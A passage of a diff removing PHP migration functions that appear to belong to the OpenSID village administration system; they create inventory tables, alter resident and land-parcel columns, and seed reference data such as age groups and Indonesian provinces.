-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id),
-				CONSTRAINT FK_mutasi_inventaris_tanah FOREIGN KEY (id_inventaris_tanah) REFERENCES inventaris_tanah(id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('inventaris_peralatan') )
-		{
-			$query = "
-			CREATE TABLE `inventaris_peralatan` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`nama_barang` varchar(255) NOT NULL,
-				`kode_barang` varchar(64) NOT NULL,
-				`register` varchar(64) NOT NULL,
-				`merk` varchar(255) NOT NULL,
-				`ukuran`text NOT NULL,
-				`bahan` text NOT NULL,
-				`tahun_pengadaan` year(4) NOT NULL,
-				`no_pabrik` varchar(255) NULL,
-				`no_rangka` varchar(255) NULL,
-				`no_mesin` varchar(255) NULL,
-				`no_polisi` varchar(255) NULL,
-				`no_bpkb` varchar(255) NULL,
-				`asal` varchar(255) NOT NULL,
-				`harga` double NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`status` int(1) NOT NULL DEFAULT '0',
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('mutasi_inventaris_peralatan') )
-		{
-			$query = "
-			CREATE TABLE `mutasi_inventaris_peralatan` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`id_inventaris_peralatan` int(11),
-				`jenis_mutasi` varchar(255) NOT NULL,
-				`tahun_mutasi` date NOT NULL,
-				`harga_jual` double NOT NULL,
-				`sumbangkan` varchar(255) NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id),
-				CONSTRAINT FK_mutasi_inventaris_peralatan FOREIGN KEY (id_inventaris_peralatan) REFERENCES inventaris_peralatan(id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('inventaris_gedung') )
-		{
-			$query = "
-			CREATE TABLE `inventaris_gedung` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`nama_barang` varchar(255) NOT NULL,
-				`kode_barang` varchar(64) NOT NULL,
-				`register` varchar(64) NOT NULL,
-				`kondisi_bangunan` varchar(255) NOT NULL,
-				`kontruksi_bertingkat` varchar(255) NOT NULL,
-				`kontruksi_beton` int(1) NOT NULL,
-				`luas_bangunan` int(64) NOT NULL,
-				`letak` varchar(255) NOT NULL,
-				`tanggal_dokument`DATE NULL,
-				`no_dokument` varchar(255) NULL,
-				`luas` int(64) NULL,
-				`status_tanah` varchar(255) NULL,
-				`kode_tanah` varchar(255) NULL,
-				`asal` varchar(255) NOT NULL,
-				`harga` double NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`status` int(1) NOT NULL DEFAULT '0',
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('mutasi_inventaris_gedung') )
-		{
-			$query = "
-			CREATE TABLE `mutasi_inventaris_gedung` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`id_inventaris_gedung` int(11),
-				`jenis_mutasi` varchar(255) NOT NULL,
-				`tahun_mutasi` date NOT NULL,
-				`harga_jual` double NOT NULL,
-				`sumbangkan` varchar(255) NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id),
-				CONSTRAINT FK_mutasi_inventaris_gedung FOREIGN KEY (id_inventaris_gedung) REFERENCES inventaris_gedung(id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('inventaris_jalan') )
-		{
-			$query = "
-			CREATE TABLE `inventaris_jalan` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`nama_barang` varchar(255) NOT NULL,
-				`kode_barang` varchar(64) NOT NULL,
-				`register` varchar(64) NOT NULL,
-				`kontruksi` varchar(255) NOT NULL,
-				`panjang` int(64) NOT NULL,
-				`lebar`int(64) NOT NULL,
-				`luas` int(64) NOT NULL,
-				`letak` text NULL,
-				`tanggal_dokument` date NOT NULL,
-				`no_dokument` varchar(255) DEFAULT NULL,
-				`status_tanah` varchar(255) DEFAULT NULL,
-				`kode_tanah` varchar(255) DEFAULT NULL,
-				`kondisi` varchar(255) NOT NULL,
-				`asal` varchar(255) NOT NULL,
-				`harga` double NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`status` int(1) NOT NULL DEFAULT '0',
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('mutasi_inventaris_jalan') )
-		{
-			$query = "
-			CREATE TABLE `mutasi_inventaris_jalan` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`id_inventaris_jalan` int(11),
-				`jenis_mutasi` varchar(255) NOT NULL,
-				`tahun_mutasi` date NOT NULL,
-				`harga_jual` double NOT NULL,
-				`sumbangkan` varchar(255) NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id),
-				CONSTRAINT FK_mutasi_inventaris_jalan FOREIGN KEY (id_inventaris_jalan) REFERENCES inventaris_jalan(id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('inventaris_asset') )
-		{
-			$query = "
-			CREATE TABLE `inventaris_asset` (
-				`id` int(11) AUTO_INCREMENT NOT NULL,
-				`nama_barang` varchar(255) NOT NULL,
-				`kode_barang` varchar(64) NOT NULL,
-				`register` varchar(64) NOT NULL,
-				`jenis` varchar(255) NOT NULL,
-				`judul_buku` varchar(255) NULL,
-				`spesifikasi_buku` varchar(255) NULL,
-				`asal_daerah` varchar(255) NULL,
-				`pencipta` varchar(255) NULL,
-				`bahan` varchar(255) NULL,
-				`jenis_hewan` varchar(255) NULL,
-				`ukuran_hewan` varchar(255) NULL,
-				`jenis_tumbuhan` varchar(255) NULL,
-				`ukuran_tumbuhan` varchar(255) NULL,
-				`jumlah` int(64) NOT NULL,
-				`tahun_pengadaan` year(4) NOT NULL,
-				`asal` varchar(255) NOT NULL,
-				`harga` double NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`status` int(1) NOT NULL DEFAULT '0',
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('mutasi_inventaris_asset') )
-		{
-			$query = "
-			CREATE TABLE `mutasi_inventaris_asset` (
-				`id` int(11) NOT NULL AUTO_INCREMENT,
-				`id_inventaris_asset` int(11),
-				`jenis_mutasi` varchar(255) NOT NULL,
-				`tahun_mutasi` date NOT NULL,
-				`harga_jual` double NOT NULL,
-				`sumbangkan` varchar(255) NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id),
-				CONSTRAINT FK_mutasi_inventaris_asset FOREIGN KEY (id_inventaris_asset) REFERENCES inventaris_asset(id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('inventaris_kontruksi') )
-		{
-			$query = "
-			CREATE TABLE `inventaris_kontruksi` (
-				`id` int(11) AUTO_INCREMENT NOT NULL ,
-				`nama_barang` varchar(255) NOT NULL,
-				`kondisi_bangunan` varchar(255) NOT NULL,
-				`kontruksi_bertingkat` varchar(255) NOT NULL,
-				`kontruksi_beton` int(1) NOT NULL,
-				`luas_bangunan` int(64) NOT NULL,
-				`letak` varchar(255) NOT NULL,
-				`tanggal_dokument` date DEFAULT NULL,
-				`no_dokument` varchar(255) DEFAULT NULL,
-				`tanggal` date DEFAULT NULL,
-				`status_tanah` varchar(255) DEFAULT NULL,
-				`kode_tanah` varchar(255) DEFAULT NULL,
-				`asal` varchar(255) NOT NULL,
-				`harga` double NOT NULL,
-				`keterangan` text NOT NULL,
-				`created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-				`created_by` int(11) NOT NULL,
-				`updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
-				`updated_by` int(11) NOT NULL,
-				`status` int(1) NOT NULL DEFAULT '0',
-				`visible` int(1) NOT NULL DEFAULT '1',
-				PRIMARY KEY (id)
-			)
-			";
-			$this->db->query($query);
-		}
-
-		$fields = array();
-		if (!$this->db->field_exists('jenis_pemilik', 'data_persil'))
-		{
-			$fields['jenis_pemilik'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2,
-					'null' => FALSE,
-					'default' => 1 // pemilik desa
-			);
-		}
-		if (!$this->db->field_exists('pemilik_luar', 'data_persil'))
-		{
-			$fields['pemilik_luar'] = array(
-					'type' => 'varchar',
-					'constraint' => 100
-			);
-		}
-		$this->dbforge->add_column('data_persil', $fields);
-		// Sesuaikan data pemilik luar desa yg sudah ada ke kolom baru
-		if (count($fields) > 0)
-		{
-			$data = $this->db->get('data_persil')->result_array();
-			foreach ($data as $persil)
-			{
-				if (!is_numeric($persil['nik']) AND $persil['nik']<>'')
-				{
-					$data_update = array(
-						'jenis_pemilik' => '2',
-						'pemilik_luar' => $persil['nik'],
-						'nik' => 999   // NIK_LUAR_DESA
-					);
-					$this->db->where('id', $persil['id'])->update('data_persil', $data_update);
-				}
-			}
-		}
-		if ($this->db->field_exists('alamat_ext', 'data_persil'))
-		{
-			$fields = array();
-			$fields['alamat_ext'] = array(
-					'name' => 'alamat_luar',
-					'type' => 'varchar',
-					'constraint' => 100
-			);
-			$this->dbforge->modify_column('data_persil', $fields);
-		}
-
-	}
-
-	private function migrasi_211_ke_1806()
-	{
-		//ambil nilai path
-		$config = $this->db->get('config')->row();
-		if (!empty($config))
-		{
-			//Cek apakah path kosong atau tidak
-			if (!empty($config->path))
-			{
-				//Cek pola path yang lama untuk diganti dengan yang baru
-				//Jika pola path masih yang lama, ganti dengan yang baru
-				if (preg_match('/((\([-+]?[0-9]{1,3}\.[0-9]*,(\s)?[-+]?[0-9]{1,3}\.[0-9]*\))\;)/', $config->path))
-				{
-					$new_path = str_replace(array(');', '(', '][' ), array(']','[','],['), $config->path);
-				 $this->db->where('id', $config->id)->update('config', array('path' => "[[$new_path]]"));
-				}
-			}
-			//Cek zoom agar tidak lebih dari 18 dan agar tidak kosong
-			if(empty($config->zoom) || $config->zoom > 18 || $config->zoom == 0){
-					$this->db->where('id', $config->id)->update('config', array('zoom' => 10));
-			}
-		}
-
-		//Penambahan widget peta wilayah desa
-		$widget = $this->db->select('id, isi')->where('isi', 'peta_wilayah_desa.php')->get('widget')->row();
-		if (empty($widget))
-		{
-			//Penambahan widget peta wilayah desa sebagai widget sistem
-			$peta_wilayah = array(
-				'isi'           => 'peta_wilayah_desa.php',
-				'enabled'       => 1,
-				'judul'         => 'Peta Wilayah Desa',
-				'jenis_widget'  => 1,
-				'urut'          => 1,
-				'form_admin'    => 'hom_desa/konfigurasi'
-			);
-			$this->db->insert('widget', $peta_wilayah);
-		}
-		else
-		{
-			// Paksa update karena sudah ada yang menggunakan versi pra-rilis sebelumnya
-			$this->db->where('id', $widget->id)
-				->update('widget', array('form_admin' => 'hom_desa/konfigurasi'));
-		}
-
-		//ubah icon kecil dan besar untuk modul Sekretariat
-		$this->db->where('url','sekretariat')->update('setting_modul',array('ikon'=>'document-open-8.png', 'ikon_kecil'=>'fa fa-file fa-lg'));
-		 // Hapus kolom yg tidak digunakan
-		if ($this->db->field_exists('alamat_tempat_lahir', 'tweb_penduduk'))
-			$this->dbforge->drop_column('tweb_penduduk', 'alamat_tempat_lahir');
-	}
-
-	private function migrasi_210_ke_211()
-	{
-		// Tambah kolom jenis untuk analisis_master
-		$fields = array();
-		if (!$this->db->field_exists('jenis', 'analisis_master'))
-		{
-			$fields['jenis'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2,
-					'null' => FALSE,
-					'default' => 2 // bukan bawaan sistem
-			);
-		}
-		$this->dbforge->add_column('analisis_master', $fields);
-		// Impor analisis Data Dasar Keluarga kalau belum ada.
-		// Ubah versi pra-rilis yang sudah diganti menjadi non-sistem
-		$ddk_lama = $this->db->where('kode_analisis', 'DDKPD')->where('jenis', 1)
-			->get('analisis_master')->row();
-		if ($ddk_lama)
-		{
-			$this->db->where('id',$ddk_lama->id)
-			->update('analisis_master',array('jenis' => 2, 'nama' => '[kadaluarsa] '.$ddk_lama->nama));
-		}
-		$query = $this->db->where('kode_analisis', 'DDK02')
-			->get('analisis_master')->result_array();
-		if (count($query) == 0)
-		{
-			$file_analisis = FCPATH . 'assets/import/analisis_DDK_Profil_Desa.xls';
-			$this->analisis_import_model->import_excel($file_analisis,'DDK02',$jenis = 1);
-		}
-		// Impor analisis Data Anggota Keluarga kalau belum ada
-		// Ubah versi pra-rilis yang sudah diganti menjadi non-sistem
-		$dak_lama = $this->db->where('kode_analisis','DAKPD')->where('jenis', 1)
-			->get('analisis_master')->row();
-		if ($dak_lama)
-		{
-			$this->db->where('id',$dak_lama->id)
-			->update('analisis_master',array('jenis' => 2, 'nama' => '[kadaluarsa] '.$dak_lama->nama));
-		}
-		$dak = $this->db->where('kode_analisis', 'DAK02')
-			->get('analisis_master')->row();
-		if (empty($dak))
-		{
-			$file_analisis = FCPATH . 'assets/import/analisis_DAK_Profil_Desa.xls';
-			$id_dak = $this->analisis_import_model->import_excel($file_analisis,'DAK02', $jenis = 1);
-		} else $id_dak = $dak->id;
-		// Tambah kolom is_teks pada analisis_indikator
-		$fields = array();
-		if (!$this->db->field_exists('is_teks', 'analisis_indikator'))
-		{
-			$fields['is_teks'] = array(
-					'type' => 'tinyint',
-					'constraint' => 1,
-					'null' => FALSE,
-					'default' => 0 // isian pertanyaan menggunakan kode
-			);
-		}
-		$this->dbforge->add_column('analisis_indikator', $fields);
-		// Ubah pertanyaan2 DAK profil desa menggunakan teks
-		$pertanyaan = array(
-			'Cacat Fisik',
-			'Cacat Mental',
-			'Kedudukan Anggota Keluarga sebagai Wajib Pajak dan Retribusi',
-			'Lembaga Pemerintahan Yang Diikuti Anggota Keluarga',
-			'Lembaga Kemasyarakatan Yang Diikuti Anggota Keluarga',
-			'Lembaga Ekonomi Yang Dimiliki Anggota Keluarga'
-		);
-		$list_pertanyaan = sql_in_list($pertanyaan);
-		$this->db->where('id_master',$id_dak)->where("pertanyaan in($list_pertanyaan)")
-			->update('analisis_indikator',array('is_teks' => 1));
-	}
-
-	private function migrasi_29_ke_210()
-	{
-		// Tambah kolom untuk format impor respon untuk analisis_master
-			$fields = array();
-			if (!$this->db->field_exists('format_impor', 'analisis_master'))
-			{
-				$fields['format_impor'] = array(
-						'type' => 'tinyint',
-						'constraint' => 2
-				);
-			}
-			$this->dbforge->add_column('analisis_master', $fields);
-		// Tambah setting timezone
-		$setting = $this->db->where('key','timezone')->get('setting_aplikasi')->row()->id;
-		if (!$setting)
-		{
-			$this->db->insert('setting_aplikasi',array('key'=>'timezone','value'=>'Asia/Jakarta','keterangan'=>'Zona waktu perekaman waktu dan tanggal'));
-		}
-		// Tambah tabel inventaris
-		if (!$this->db->table_exists('jenis_barang') )
-		{
-			$query = "
-				CREATE TABLE jenis_barang (
-					id int NOT NULL AUTO_INCREMENT,
-					nama varchar(30),
-					keterangan varchar(100),
-					PRIMARY KEY (id)
-				);
-			";
-			$this->db->query($query);
-		}
-		if (!$this->db->table_exists('inventaris') )
-		{
-			$query = "
-				CREATE TABLE inventaris (
-					id int NOT NULL AUTO_INCREMENT,
-					id_jenis_barang int(6),
-					asal_sendiri int(6),
-					asal_pemerintah int(6),
-					asal_provinsi int(6),
-					asal_kab int(6),
-					asal_sumbangan int(6),
-					hapus_rusak int(6),
-					hapus_dijual int(6),
-					hapus_sumbangkan int(6),
-					tanggal_mutasi date NOT NULL,
-					jenis_mutasi int(6),
-					keterangan varchar(100),
-					PRIMARY KEY (id),
-					FOREIGN KEY (id_jenis_barang)
-						REFERENCES jenis_barang(id)
-						ON DELETE CASCADE
-				);
-			";
-			$this->db->query($query);
-		}
-		// Perubahan pada pra-rilis
-		// Hapus kolom
-		$daftar_kolom = array('asal_sendiri','asal_pemerintah','asal_provinsi','asal_kab','asal_sumbangan','tanggal_mutasi','jenis_mutasi','hapus_rusak','hapus_dijual','hapus_sumbangkan');
-		foreach ($daftar_kolom as $kolom)
-		{
-			if ($this->db->field_exists($kolom, 'inventaris'))
-				$this->dbforge->drop_column('inventaris', $kolom);
-		}
-		// Tambah kolom
-		$fields = array();
-		if (!$this->db->field_exists('tanggal_pengadaan', 'inventaris'))
-		{
-			$fields['tanggal_pengadaan'] = array(
-					'type' => 'date',
-					'null' => FALSE
-			);
-		}
-		if (!$this->db->field_exists('nama_barang', 'inventaris'))
-		{
-			$fields['nama_barang'] = array(
-					'type' => 'VARCHAR',
-					'constraint' => 100
-			);
-		}
-		if (!$this->db->field_exists('asal_barang', 'inventaris'))
-		{
-			$fields['asal_barang'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2
-			);
-		}
-		if (!$this->db->field_exists('jml_barang', 'inventaris'))
-		{
-			$fields['jml_barang'] = array(
-					'type' => 'int',
-					'constraint' => 6
-			);
-		}
-		$this->dbforge->add_column('inventaris', $fields);
-		if (!$this->db->table_exists('mutasi_inventaris') )
-		{
-			$query = "
-				CREATE TABLE mutasi_inventaris (
-					id int NOT NULL AUTO_INCREMENT,
-					id_barang int(6),
-					tanggal_mutasi date NOT NULL,
-					jenis_mutasi tinyint(2),
-					jenis_penghapusan tinyint(2),
-					jml_mutasi int(6),
-					keterangan varchar(100),
-					PRIMARY KEY (id),
-					FOREIGN KEY (id_barang)
-						REFERENCES inventaris(id)
-						ON DELETE CASCADE
-				);
-			";
-			$this->db->query($query);
-		}
-		// Ubah url modul program_bantuan
-		$this->db->where('url','program_bantuan')->update('setting_modul',array('url'=>'program_bantuan/clear'));
-	}
-
-	private function migrasi_28_ke_29()
-	{
-		// Tambah data kelahiran ke tweb_penduduk
-		$fields = array();
-		if (!$this->db->field_exists('waktu_lahir', 'tweb_penduduk'))
-		{
-			$fields['waktu_lahir'] = array(
-					'type' => 'VARCHAR',
-					'constraint' => 5
-			);
-		}
-		if (!$this->db->field_exists('tempat_dilahirkan', 'tweb_penduduk'))
-		{
-			$fields['tempat_dilahirkan'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2
-			);
-		}
-		if (!$this->db->field_exists('alamat_tempat_lahir', 'tweb_penduduk'))
-		{
-			$fields['alamat_tempat_lahir'] = array(
-					'type' => 'VARCHAR',
-					'constraint' => 100
-			);
-		}
-		if (!$this->db->field_exists('jenis_kelahiran', 'tweb_penduduk'))
-		{
-			$fields['jenis_kelahiran'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2
-			);
-		}
-		if (!$this->db->field_exists('kelahiran_anak_ke', 'tweb_penduduk'))
-		{
-			$fields['kelahiran_anak_ke'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2
-			);
-		}
-		if (!$this->db->field_exists('penolong_kelahiran', 'tweb_penduduk'))
-		{
-			$fields['penolong_kelahiran'] = array(
-					'type' => 'tinyint',
-					'constraint' => 2
-			);
-		}
-		if (!$this->db->field_exists('berat_lahir', 'tweb_penduduk'))
-		{
-			$fields['berat_lahir'] = array(
-					'type' => 'varchar',
-					'constraint' => 10
-			);
-		}
-		if (!$this->db->field_exists('panjang_lahir', 'tweb_penduduk'))
-		{
-			$fields['panjang_lahir'] = array(
-					'type' => 'varchar',
-					'constraint' => 10
-			);
-		}
-		$this->dbforge->add_column('tweb_penduduk', $fields);
-
-		// Hapus kolom yg tidak digunakan
-		if ($this->db->field_exists('pendidikan_id', 'tweb_penduduk'))
-			$this->dbforge->drop_column('tweb_penduduk', 'pendidikan_id');
-		// Tambah kolom e-ktp di tabel tweb_penduduk
-		if (!$this->db->field_exists('ktp_el', 'tweb_penduduk'))
-		{
-			$fields = array(
-				'ktp_el' => array(
-					'type' => tinyint,
-					'constraint' => 4
-				)
-			);
-			$this->dbforge->add_column('tweb_penduduk', $fields);
-		}
-		if (!$this->db->field_exists('status_rekam', 'tweb_penduduk'))
-		{
-			$fields = array(
-				'status_rekam' => array(
-					'type' => tinyint,
-					'constraint' => 4,
-					'null' => FALSE,
-					'default' => 0
-				)
-			);
-			$this->dbforge->add_column('tweb_penduduk', $fields);
-		}
-		 // Tambah tabel status_rekam
-		$query = "DROP TABLE IF EXISTS tweb_status_ktp;";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE tweb_status_ktp (
-				id tinyint(5) NOT NULL AUTO_INCREMENT,
-				nama varchar(50) NOT NULL,
-				ktp_el tinyint(4) NOT NULL,
-				status_rekam varchar(50) NOT NULL,
-				PRIMARY KEY (id)
-			) ENGINE=".$this->engine." AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;
-		";
-		$this->db->query($query);
-
-		$query = "
-			INSERT INTO tweb_status_ktp (id, nama, ktp_el, status_rekam) VALUES
-			(1, 'BELUM REKAM', 1, '2'),
-			(2, 'SUDAH REKAM', 2, '3'),
-			(3, 'CARD PRINTED', 2, '4'),
-			(4, 'PRINT READY RECORD', 2 ,'5'),
-			(5, 'CARD SHIPPED', 2, '6'),
-			(6, 'SENT FOR CARD PRINTING', 2, '7'),
-			(7, 'CARD ISSUED', 2, '8');
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_27_ke_28()
-	{
-		if (!$this->db->table_exists('suplemen') )
-		{
-			$query = "
-				CREATE TABLE suplemen (
-					id int NOT NULL AUTO_INCREMENT,
-					nama varchar(100),
-					sasaran tinyint(4),
-					keterangan varchar(300),
-					PRIMARY KEY (id)
-				);
-			";
-			$this->db->query($query);
-		}
-		if (!$this->db->table_exists('suplemen_terdata') )
-		{
-			$query = "
-				CREATE TABLE suplemen_terdata (
-					id int NOT NULL AUTO_INCREMENT,
-					id_suplemen int(10),
-					id_terdata varchar(20),
-					sasaran tinyint(4),
-					keterangan varchar(100),
-					PRIMARY KEY (id),
-					FOREIGN KEY (id_suplemen)
-						REFERENCES suplemen(id)
-						ON DELETE CASCADE
-				);
-			";
-			$this->db->query($query);
-		}
-		// Hapus surat permohonan perubahan kk (yang telah diubah menjadi kartu keluarga)
-		$data = array(
-			'nama'=>'Permohonan Perubahan Kartu Keluarga',
-			'url_surat'=>'surat_permohonan_perubahan_kartu_keluarga',
-			'kode_surat'=>'S-41',
-			'lampiran'=>'f-1.16.php,f-1.01.php',
-			'jenis'=>1);
-		$hasil = $this->db->where('url_surat','surat_permohonan_perubahan_kk')->get('tweb_surat_format');
-		if ($hasil->num_rows() > 0)
-		{
-			$this->db->where('url_surat','surat_permohonan_perubahan_kk')->update('tweb_surat_format', $data);
-		}
-		else
-		{
-			// Tambah surat permohonan perubahan kartu keluarga
-			$sql = $this->db->insert_string('tweb_surat_format', $data);
-			$sql .= " ON DUPLICATE KEY UPDATE
-					nama = VALUES(nama),
-					url_surat = VALUES(url_surat),
-					kode_surat = VALUES(kode_surat),
-					lampiran = VALUES(lampiran),
-					jenis = VALUES(jenis)";
-			$this->db->query($sql);
-		}
-	}
-
-	private function migrasi_26_ke_27()
-	{
-		// Sesuaikan judul kelompok umur dengan SID 3.10 versi Okt 2017
-		$this->db->truncate('tweb_penduduk_umur');
-		$sql = '
-			INSERT INTO tweb_penduduk_umur VALUES
-			("1","BALITA","0","5","0"),
-			("2","ANAK-ANAK","6","17","0"),
-			("3","DEWASA","18","30","0"),
-			("4","TUA","31","120","0"),
-			("6","Di bawah 1 Tahun","0","1","1"),
-			("9","2 s/d 4 Tahun","2","4","1"),
-			("12","5 s/d 9 Tahun","5","9","1"),
-			("13","10 s/d 14 Tahun","10","14","1"),
-			("14","15 s/d 19 Tahun","15","19","1"),
-			("15","20 s/d 24 Tahun","20","24","1"),
-			("16","25 s/d 29 Tahun","25","29","1"),
-			("17","30 s/d 34 Tahun","30","34","1"),
-			("18","35 s/d 39 Tahun ","35","39","1"),
-			("19","40 s/d 44 Tahun","40","44","1"),
-			("20","45 s/d 49 Tahun","45","49","1"),
-			("21","50 s/d 54 Tahun","50","54","1"),
-			("22","55 s/d 59 Tahun","55","59","1"),
-			("23","60 s/d 64 Tahun","60","64","1"),
-			("24","65 s/d 69 Tahun","65","69","1"),
-			("25","70 s/d 74 Tahun","70","74","1"),
-			("26","Di atas 75 Tahun","75","99999","1");
-		';
-		$this->db->query($sql);
-		// Tambah tombol media sosial Instagram
-		$query = "
-			INSERT INTO media_sosial (id, gambar, link, nama, enabled) VALUES ('5', 'ins.png', '', 'Instagram', '1')
-			ON DUPLICATE KEY UPDATE
-				gambar = VALUES(gambar),
-				nama = VALUES(nama)";
-		$this->db->query($query);
-		// Ganti kelas sosial dengan tingkatan keluarga sejahtera dari BKKBN
-		if ($this->db->table_exists('ref_kelas_sosial') )
-		{
-			$this->dbforge->drop_table('ref_kelas_sosial');
-		}
-		if (!$this->db->table_exists('tweb_keluarga_sejahtera') )
-		{
-			$query = "
-				CREATE TABLE `tweb_keluarga_sejahtera` (
-					`id` int(10),
-					`nama` varchar(100),
-					PRIMARY KEY  (`id`)
-				);
-			";
-			$this->db->query($query);
-			$query = "
-				INSERT INTO `tweb_keluarga_sejahtera` (`id`, `nama`) VALUES
-				(1,  'Keluarga Pra Sejahtera'),
-				(2,  'Keluarga Sejahtera I'),
-				(3,  'Keluarga Sejahtera II'),
-				(4,  'Keluarga Sejahtera III'),
-				(5,  'Keluarga Sejahtera III Plus')
-			";
-			$this->db->query($query);
-		}
-		// Tambah surat izin orang tua/suami/istri
-		$data = array(
-			'nama'=>'Keterangan Izin Orang Tua/Suami/Istri',
-			'url_surat'=>'surat_izin_orangtua_suami_istri',
-			'kode_surat'=>'S-39',
-			'jenis'=>1);
-		$sql = $this->db->insert_string('tweb_surat_format', $data);
-		$sql .= " ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis)";
-		$this->db->query($sql);
-		// Tambah surat sporadik
-		$data = array(
-			'nama'=>'Pernyataan Penguasaan Fisik Bidang Tanah (SPORADIK)',
-			'url_surat'=>'surat_sporadik',
-			'kode_surat'=>'S-40',
-			'jenis'=>1);
-		$sql = $this->db->insert_string('tweb_surat_format', $data);
-		$sql .= " ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis)";
-		$this->db->query($sql);
-	}
-
-	private function migrasi_25_ke_26()
-	{
-		// Tambah tabel provinsi
-		if (!$this->db->table_exists('provinsi') )
-		{
-			$query = "
-				CREATE TABLE `provinsi` (
-					`kode` tinyint(2),
-					`nama` varchar(100),
-					PRIMARY KEY  (`kode`)
-				);
-			";
-			$this->db->query($query);
-			$query = "
-				INSERT INTO `provinsi` (`kode`, `nama`) VALUES
-				(11,  'Aceh'),
-				(12,  'Sumatera Utara'),
-				(13,  'Sumatera Barat'),
-				(14,  'Riau'),
-				(15,  'Jambi'),
-				(16,  'Sumatera Selatan'),
-				(17,  'Bengkulu'),
-				(18,  'Lampung'),
-				(19,  'Kepulauan Bangka Belitung'),
-				(21,  'Kepulauan Riau'),
-				(31,  'DKI Jakarta'),
-				(32,  'Jawa Barat'),
-				(33,  'Jawa Tengah'),
-				(34,  'DI Yogyakarta'),
-				(35,  'Jawa Timur'),
-				(36,  'Banten'),
-				(51,  'Bali'),
-				(52,  'Nusa Tenggara Barat'),
-				(53,  'Nusa Tenggara Timur'),
